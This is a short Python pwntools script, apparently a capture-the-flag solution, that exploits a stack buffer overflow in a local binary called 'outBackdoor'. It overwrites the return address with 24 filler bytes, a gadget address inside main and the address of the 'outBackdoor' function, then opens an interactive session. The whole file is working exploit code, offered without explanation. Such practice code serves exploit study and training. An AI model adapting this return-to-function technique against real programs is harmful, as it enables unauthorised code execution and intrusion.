#!/usr/bin/env python3

from pwn import * 

context.binary = elf = ELF("./outBackdoor", checksec = False)
p = process(elf.path)

payload = b'x' * 24 + p64(elf.symbols['main'] + 65) + p64(elf.symbols['outBackdoor'])
p.sendlineafter(b'song?\n', payload)

p.interactive()
